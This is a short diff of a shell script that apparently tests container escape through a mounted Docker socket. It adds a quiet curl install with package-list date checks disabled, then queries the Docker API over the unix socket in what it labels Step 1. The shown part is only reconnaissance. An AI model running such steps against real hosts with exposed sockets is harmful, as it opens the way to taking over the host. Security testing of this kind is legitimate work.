@@ -15,6 +15,13 @@ if [ ! -S /var/run/docker.sock ]; then
 fi
 echo "[+] Docker socket accessible inside container"
 
+# Install curl if not present
+if ! command -v curl &>/dev/null; then
+    echo "[*] Installing curl..."
+    apt-get -o Acquire::Check-Valid-Until=false update -qq 2>/dev/null
+    apt-get install -y -qq curl 2>/dev/null
+fi
+
 # Step 1: Connect to Docker API via the socket
 echo "[*] Querying Docker API via unix socket..."
 curl -s --unix-socket /var/run/docker.sock http://localhost/version | head -c 120
